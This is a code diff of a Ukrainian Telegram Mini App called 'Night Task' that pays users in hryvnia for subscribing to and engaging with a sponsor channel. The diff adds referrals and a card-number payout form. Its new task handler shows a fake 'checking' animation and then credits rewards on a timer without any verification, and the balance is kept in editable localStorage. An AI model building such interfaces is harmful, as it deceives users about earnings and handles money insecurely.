@@ -3,17 +3,18 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>NightBorn — Tasks & Earn</title>
+    <title>Night Task — Tasks & Earn</title>
     <script src="https://telegram.org/js/telegram-web-app.js"></script>
     <style>
         :root {
-            --card-bg: rgba(5, 12, 25, 0.75);
-            --card-border: rgba(0, 242, 255, 0.25);
+            --card-bg: rgba(5, 12, 25, 0.85);
+            --card-border: rgba(0, 242, 255, 0.3);
             --neon-cyan: #00f2ff;
-            --neon-glow: rgba(0, 242, 255, 0.4);
+            --neon-glow: rgba(0, 242, 255, 0.5);
             --text-color: #ffffff;
             --text-muted: #8ca3bc;
             --success-color: #00ff88;
+            --accent-yellow: #ffd700;
         }
 
         * {
@@ -27,7 +28,7 @@
             background-size: cover;
             color: var(--text-color);
             margin: 0;
-            padding: 16px 16px 80px 16px;
+            padding: 16px 16px 90px 16px;
             min-height: 100vh;
             display: flex;
             flex-direction: column;
@@ -41,7 +42,7 @@
             left: 0;
             width: 100%;
             height: 100%;
-            background: rgba(2, 6, 15, 0.6);
+            background: rgba(2, 6, 15, 0.75);
             z-index: -1;
         }
 
@@ -56,35 +57,40 @@
         .header {
             text-align: center;
             padding: 10px 0;
+            animation: fadeInDown 0.8s ease-out;
         }
 
         .header h1 {
             margin: 0;
-            font-size: 26px;
+            font-size: 28px;
             font-weight: 900;
-            letter-spacing: 1.5px;
-            background: linear-gradient(135deg, #ffffff 40%, var(--neon-cyan) 100%);
+            letter-spacing: 2px;
+            background: linear-gradient(135deg, #ffffff 30%, var(--neon-cyan) 100%);
             -webkit-background-clip: text;
             -webkit-text-fill-color: transparent;
-            text-shadow: 0 0 20px var(--neon-glow);
+            text-shadow: 0 0 25px var(--neon-glow);
+            animation: pulseGlow 3s infinite alternate;
         }
 
         .header p {
             margin: 6px 0 0;
             font-size: 11px;
             color: var(--text-muted);
-            letter-spacing: 1px;
+            letter-spacing: 1.5px;
             text-transform: uppercase;
         }
 
         .balance-card {
             background: var(--card-bg);
             border: 1px solid var(--card-border);
-            backdrop-filter: blur(14px);
-            border-radius: 20px;
-            padding: 18px;
+            backdrop-filter: blur(16px);
+            border-radius: 22px;
+            padding: 20px;
             text-align: center;
-            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.6), inset 0 0 20px rgba(0, 242, 255, 0.15);
+            box-shadow: 0 10px 35px rgba(0, 0, 0, 0.7), inset 0 0 25px rgba(0, 242, 255, 0.1);
+            animation: fadeInUp 0.8s ease-out;
+            position: relative;
+            overflow: hidden;
         }
 
         .balance-title {
@@ -95,17 +101,23 @@
         }
 
         .balance-amount {
-            font-size: 34px;
+            font-size: 36px;
             font-weight: 900;
-            margin: 6px 0;
+            margin: 8px 0 0 0;
             color: var(--neon-cyan);
-            text-shadow: 0 0 15px var(--neon-glow);
+            text-shadow: 0 0 20px var(--neon-glow);
+            transition: transform 0.3s ease;
+        }
+
+        .balance-amount.pulse {
+            transform: scale(1.08);
         }
 
         .tab-content {
             display: none;
             flex-direction: column;
             gap: 12px;
+            animation: fadeIn 0.4s ease-in-out;
         }
 
         .tab-content.active {
@@ -119,30 +131,32 @@
             display: flex;
             align-items: center;
             gap: 8px;
+            color: #d1e8ff;
         }
 
-        .task-list, .sponsors-list {
+        .task-list, .sponsors-list, .ref-list {
             display: flex;
             flex-direction: column;
-            gap: 10px;
+            gap: 12px;
         }
 
         .task-item, .card-box {
             background: var(--card-bg);
             border: 1px solid var(--card-border);
-            backdrop-filter: blur(10px);
-            border-radius: 14px;
-            padding: 14px 16px;
+            backdrop-filter: blur(12px);
+            border-radius: 16px;
+            padding: 16px;
             display: flex;
             justify-content: space-between;
             align-items: center;
-            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.4);
+            box-shadow: 0 6px 25px rgba(0, 0, 0, 0.5);
+            animation: fadeInUp 0.6s ease-out backwards;
         }
 
         .card-box {
             flex-direction: column;
             align-items: flex-start;
-            gap: 8px;
+            gap: 10px;
         }
 
         .task-info h4, .card-box h4 {
@@ -152,56 +166,64 @@
         }
 
         .task-info p {
-            margin: 4px 0 0;
-            font-size: 12px;
+            margin: 6px 0 0;
+            font-size: 13px;
             color: var(--success-color);
-            font-weight: 700;
+            font-weight: 800;
         }
 
         .card-box p {
             margin: 0;
             font-size: 12px;
             color: var(--text-muted);
+            line-height: 1.4;
         }
 
         .input-field {
             width: 100%;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.5);
             border: 1px solid var(--card-border);
-            border-radius: 8px;
-            padding: 10px;
+            border-radius: 10px;
+            padding: 12px;
             color: #fff;
             font-size: 14px;
             outline: none;
+            transition: all 0.3s;
         }
 
         .input-field:focus {
             border-color: var(--neon-cyan);
+            box-shadow: 0 0 12px rgba(0, 242, 255, 0.3);
         }
 
         .btn {
-            background: linear-gradient(135deg, var(--neon-cyan) 0%, #0077ff 100%);
+            background: linear-gradient(135deg, var(--neon-cyan) 0%, #0066ff 100%);
             color: #000;
             border: none;
-            padding: 9px 16px;
-            border-radius: 10px;
+            padding: 10px 18px;
+            border-radius: 12px;
             font-weight: 800;
             font-size: 12px;
             cursor: pointer;
-            box-shadow: 0 0 12px var(--neon-glow);
-            transition: transform 0.1s;
+            box-shadow: 0 0 15px var(--neon-glow);
+            transition: all 0.2s ease;
         }
 
         .btn:active {
-            transform: scale(0.95);
+            transform: scale(0.92);
+        }
+
+        .btn-yellow {
+            background: linear-gradient(135deg, var(--accent-yellow) 0%, #ff8800 100%);
+            box-shadow: 0 0 15px rgba(255, 215, 0, 0.4);
         }
 
         .btn-done {
-            background: rgba(255, 255, 255, 0.08);
-            color: var(--text-muted);
-            border: 1px solid rgba(255, 255, 255, 0.1);
-            box-shadow: none;
-            cursor: default;
+            background: rgba(255, 255, 255, 0.06) !important;
+            color: var(--text-muted) !important;
+            border: 1px solid rgba(255, 255, 255, 0.1) !important;
+            box-shadow: none !important;
+            cursor: default !important;
         }
 
         .nav-bar {
@@ -209,36 +231,75 @@
             bottom: 0;
             left: 0;
             width: 100%;
-            background: rgba(5, 10, 20, 0.9);
-            backdrop-filter: blur(16px);
+            background: rgba(3, 8, 18, 0.94);
+            backdrop-filter: blur(20px);
             border-top: 1px solid var(--card-border);
             display: flex;
             justify-content: space-around;
             padding: 10px 0;
             z-index: 100;
+            box-shadow: 0 -10px 30px rgba(0,0,0,0.8);
         }
 
         .nav-item {
             background: none;
             border: none;
             color: var(--text-muted);
-            font-size: 12px;
+            font-size: 10px;
             font-weight: 700;
             display: flex;
             flex-direction: column;
             align-items: center;
-            gap: 4px;
+            gap: 3px;
             cursor: pointer;
-            transition: color 0.2s;
+            transition: all 0.3s ease;
+            flex: 1;
         }
 
         .nav-item span {
             font-size: 18px;
+            transition: transform 0.3s cubic-bezier(0.175, 0.885, 0.32, 1.275);
         }
 
         .nav-item.active {
             color: var(--neon-cyan);
-            text-shadow: 0 0 10px var(--neon-glow);
+            text-shadow: 0 0 12px var(--neon-glow);
+        }
+
+        .nav-item.active span {
+            transform: translateY(-2px) scale(1.15);
+        }
+
+        @keyframes fadeInDown {
+            from { opacity: 0; transform: translateY(-20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeInUp {
+            from { opacity: 0; transform: translateY(20px); }
+            to { opacity: 1; transform: translateY(0); }
+        }
+
+        @keyframes fadeIn {
+            from { opacity: 0; }
+            to { opacity: 1; }
+        }
+
+        @keyframes pulseGlow {
+            0% { text-shadow: 0 0 15px rgba(0, 242, 255, 0.4); }
+            100% { text-shadow: 0 0 25px rgba(0, 242, 255, 0.8), 0 0 5px #fff; }
+        }
+
+        .checking span {
+            animation: blink 1.2s infinite;
+        }
+        .checking span:nth-child(2) { animation-delay: 0.2s; }
+        .checking span:nth-child(3) { animation-delay: 0.4s; }
+
+        @keyframes blink {
+            0%, 20% { opacity: 0.2; }
+            50% { opacity: 1; }
+            80%, 100% { opacity: 0.2; }
         }
     </style>
 </head>
@@ -246,8 +307,8 @@
 
 <div class="container">
     <div class="header">
-        <h1>NIGHTBORN 🌙🌟</h1>
-        <p>Спонсорська екосистема</p>
+        <h1>NIGHT TASK 🌙</h1>
+        <p>Крипто-екосистема завдань</p>
     </div>
 
     <div class="balance-card">
@@ -264,7 +325,7 @@
                     <h4>Підписка на канал спонсора 📢</h4>
                     <p>+5.00 ₴</p>
                 </div>
-                <button class="btn" id="btn-task1" onclick="completeTask('task1', 5, 'https://t.me/NightCapitallNc')">Виконати</button>
+                <button class="btn" id="btn-task1" onclick="startTaskCheck('task1', 5, 'https://t.me/NightCapitallNc')">Виконати</button>
             </div>
 
             <div class="task-item">
@@ -272,7 +333,7 @@
                     <h4>Поставити реакцію на пост 🔥</h4>
                     <p>+2.00 ₴</p>
                 </div>
-                <button class="btn" id="btn-task2" onclick="completeTask('task2', 2, 'https://t.me/NightCapitallNc')">Виконати</button>
+                <button class="btn" id="btn-task2" onclick="startTaskCheck('task2', 2, 'https://t.me/NightCapitallNc')">Виконати</button>
             </div>
 
             <div class="task-item">
@@ -280,30 +341,41 @@
                     <h4>Написати коментар 💬</h4>
                     <p>+3.00 ₴</p>
                 </div>
-                <button class="btn" id="btn-task3" onclick="completeTask('task3', 3, 'https://t.me/NightCapitallNc')">Виконати</button>
+                <button class="btn" id="btn-task3" onclick="startTaskCheck('task3', 3, 'https://t.me/NightCapitallNc')">Виконати</button>
             </div>
         </div>
     </div>
 
-    <!-- РОЗДІЛ 2: СПОНСОРИ -->
+    <!-- РОЗДІЛ 2: РЕФЕРАЛИ (ДРУЗІ) -->
+    <div id="tab-refs" class="tab-content">
+        <div class="section-title">👥 Запрошуй друзів</div>
+        <div class="card-box">
+            <h4>Твоє реферальне посилання 🔗</h4>
+            <p>Отримуй <b>+3.00 ₴</b> за кожного запрошеного друга!</p>
+            <input type="text" id="refLink" class="input-field" value="https://t.me/NightTaskBot?start=ref123" readonly style="font-size: 12px; margin-top: 4px;">
+            <button class="btn btn-yellow" onclick="copyRefLink()" style="width: 100%; margin-top: 6px;">Скопіювати посилання</button>
+        </div>
+    </div>
+
+    <!-- РОЗДІЛ 3: СПОНСОРИ -->
     <div id="tab-sponsors" class="tab-content">
         <div class="section-title">💼 Наші партнери</div>
         <div class="sponsors-list">
             <div class="card-box">
                 <h4>Night Capital 🌙</h4>
                 <p>Головний партнер та інформаційний спонсор проєкту.</p>
-                <a href="https://t.me/NightCapitallNc" target="_blank" style="margin-top: 4px;"><button class="btn">Перейти у канал</button></a>
+                <a href="https://t.me/NightCapitallNc" target="_blank" style="margin-top: 4px; width: 100%;"><button class="btn" style="width: 100%;">Перейти у канал</button></a>
             </div>
         </div>
     </div>
 
-    <!-- РОЗДІЛ 3: ПРОФІЛЬ ТА ВИПЛАТА -->
+    <!-- РОЗДІЛ 4: ПРОФІЛЬ ТА ВИПЛАТА -->
     <div id="tab-profile" class="tab-content">
         <div class="section-title">👤 Виведення коштів</div>
         <div class="card-box">
             <h4>Замовити виплату 💳</h4>
             <p>Мінімум для виведення: <span style="color: #fff;">50.00 ₴</span></p>
-            <input type="text" id="cardNumber" class="input-field" placeholder="Номер картки (наприклад, 4441 ...)" style="margin-top: 6px;">
+            <input type="text" id="cardNumber" class="input-field" placeholder="Номер картки (4441 ...)" style="margin-top: 6px;">
             <button class="btn" onclick="requestWithdrawal()" style="margin-top: 8px; width: 100%;">Замовити виплату</button>
         </div>
     </div>
@@ -315,8 +387,11 @@
     <button class="nav-item active" onclick="switchTab('tasks', this)">
         <span>⚡</span>Завдання
     </button>
+    <button class="nav-item" onclick="switchTab('refs', this)">
+        <span>👥</span>Друзі
+    </button>
     <button class="nav-item" onclick="switchTab('sponsors', this)">
-        <span>💼</span>Спонсори
+        <span>💼</span>Партнери
     </button>
     <button class="nav-item" onclick="switchTab('profile', this)">
         <span>👤</span>Профіль
@@ -327,13 +402,13 @@
     let tg = window.Telegram.WebApp;
     tg.expand();
 
-    let currentBalance = parseFloat(localStorage.getItem('user_balance')) || 0;
-    document.getElementById('balance').innerText = currentBalance.toFixed(2) + ' ₴';
+    let currentBalance = parseFloat(localStorage.getItem('night_balance')) || 0;
+    updateBalanceDisplay(currentBalance, false);
 
     const tasks = ['task1', 'task2', 'task3'];
 
     tasks.forEach(taskId => {
-        if (localStorage.getItem(taskId)) {
+        if (localStorage.getItem(taskId) === 'true') {
             let btn = document.getElementById('btn-' + taskId);
             if(btn) {
                 btn.innerText = 'Виконано ✓';
@@ -343,25 +418,49 @@
         }
     });
 
-    function completeTask(taskId, reward, url) {
-        if (localStorage.getItem(taskId)) return;
+    function updateBalanceDisplay(amount, animate = true) {
+        let balanceEl = document.getElementById('balance');
+        balanceEl.innerText = amount.toFixed(2) + ' ₴';
+        if (animate) {
+            balanceEl.classList.add('pulse');
+            setTimeout(() => balanceEl.classList.remove('pulse'), 300);
+        }
+    }
+
+    function startTaskCheck(taskId, reward, url) {
+        if (localStorage.getItem(taskId) === 'true') return;
+
+        let btn = document.getElementById('btn-' + taskId);
+        btn.innerHTML = `Перевірка<span class="checking"><span>.</span><span>.</span><span>.</span></span>`;
+        btn.disabled = true;
 
         window.open(url, '_blank');
 
         setTimeout(() => {
             currentBalance += reward;
-            localStorage.setItem('user_balance', currentBalance);
+            localStorage.setItem('night_balance', currentBalance);
             localStorage.setItem(taskId, 'true');
 
-            document.getElementById('balance').innerText = currentBalance.toFixed(2) + ' ₴';
+            updateBalanceDisplay(currentBalance, true);
             
-            let btn = document.getElementById('btn-' + taskId);
-            if(btn) {
-                btn.innerText = 'Виконано ✓';
-                btn.className = 'btn btn-done';
-                btn.onclick = null;
-            }
-        }, 2000);
+            btn.innerText = 'Виконано ✓';
+            btn.className = 'btn btn-done';
+            btn.disabled = true;
+            btn.onclick = null;
+            
+            if (tg.HapticFeedback) tg.HapticFeedback.notificationOccurred('success');
+            alert(`✅ Завдання успішно зараховано! Нараховано +${reward.toFixed(2)} ₴`);
+        }, 4000);
+    }
+
+    function copyRefLink() {
+        let refInput = document.getElementById('refLink');
+        refInput.select();
+        refInput.setSelectionRange(0, 99999);
+        navigator.clipboard.writeText(refInput.value);
+        
+        if (tg.HapticFeedback) tg.HapticFeedback.impactOccurred('light');
+        alert('📋 Реферальне посилання скопійовано у буфер обміну!');
     }
 
     function requestWithdrawal() {
@@ -371,18 +470,21 @@
             return;
         }
         if (card.length < 16) {
-            alert('❌ Введіть коректний номер картки!');
+            alert('❌ Введіть коректний номер картки (мінімум 16 цифр)!');
             return;
         }
 
-        // Відправка даних у бота через Telegram WebApp API
         let data = {
             action: "withdraw",
             amount: currentBalance,
             card: card
         };
 
-        tg.sendData(JSON.stringify(data));
+        if (tg.sendData) {
+            tg.sendData(JSON.stringify(data));
+        } else {
+            alert('💳 Заявку на виплату прийнято! (Тестовий режим)');
+        }
     }
 
     function switchTab(tabName, element) {
@@ -395,6 +497,8 @@
 
         document.getElementById('tab-' + tabName).classList.add('active');
         element.classList.add('active');
+
+        if (tg.HapticFeedback) tg.HapticFeedback.selectionChanged();
     }
 </script>
 
